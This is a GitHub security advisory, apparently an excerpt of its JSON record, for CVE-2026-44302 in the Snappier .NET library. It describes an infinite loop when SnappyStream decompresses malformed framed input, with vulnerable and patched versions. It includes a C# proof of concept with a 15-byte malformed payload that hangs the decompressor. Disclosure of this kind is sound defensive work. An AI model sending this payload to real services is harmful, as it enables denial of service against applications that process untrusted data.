`Snappier.SnappyStream` enters an uncatchable infinite loop when decompressing a malformed framed-format Snappy stream as small as 15 bytes.

### Details
The hang manifests as a userspace busy loop with SnappyStreamDecompressor.Decompress repeatedly calling Crc32CAlgorithm.Append. The exact non-terminating loop in or above Decompress has not been traced further.

### PoC
```csharp
using System.IO.Compression;
using Snappier;

byte[] data = { 0x00, 0x04, 0x00, 0x00, 0x64, 0x4e, 0x6c, 0x71, 0x79, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64 };
using var src = new MemoryStream(data);
using var snap = new SnappyStream(src, CompressionMode.Decompress);
using var dst = new MemoryStream();
snap.CopyTo(dst);   // never returns
```

### Impact
A caller using `SnappyStream` on attacker-controlled bytes can be made to spin forever and burn a thread until the process is killed. `try/catch` around the stream operation can't recover (no exception is thrown).", "epss": {"percentage": 0.00263, "percentile": 0.17546}, "ghsa_id": "GHSA-pggp-6c3x-2xmx", "github_reviewed_at": "2026-05-06T20:53:23Z", "html_url": "https://github.com/advisories/GHSA-pggp-6c3x-2xmx", "identifiers": [{"type": "GHSA", "value": "GHSA-pggp-6c3x-2xmx"}, {"type": "CVE", "value": "CVE-2026-44302"}], "nvd_published_at": "2026-05-12T22:16:36Z", "published_at": "2026-05-06T20:53:23Z", "references": ["https://github.com/brantburnett/Snappier/security/advisories/GHSA-pggp-6c3x-2xmx", "https://nvd.nist.gov/vuln/detail/CVE-2026-44302", "https://github.com/advisories/GHSA-pggp-6c3x-2xmx"], "repository_advisory_url": "https://api.github.com/repos/brantburnett/Snappier/security-advisories/GHSA-pggp-6c3x-2xmx", "severity": "high", "source_code_location": "https://github.com/brantburnett/Snappier", "summary": "Snappier has an infinite loop during SnappyStream decompression with malformed framed input", "type": "reviewed", "updated_at": "2026-05-13T16:41:53Z", "url": "https://api.github.com/advisories/GHSA-pggp-6c3x-2xmx", "vulnerabilities": [{"first_patched_version": "1.3.1", "package": {"ecosystem": "nuget", "name": "Snappier"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 1.3.0"}], "withdrawn_at": null}
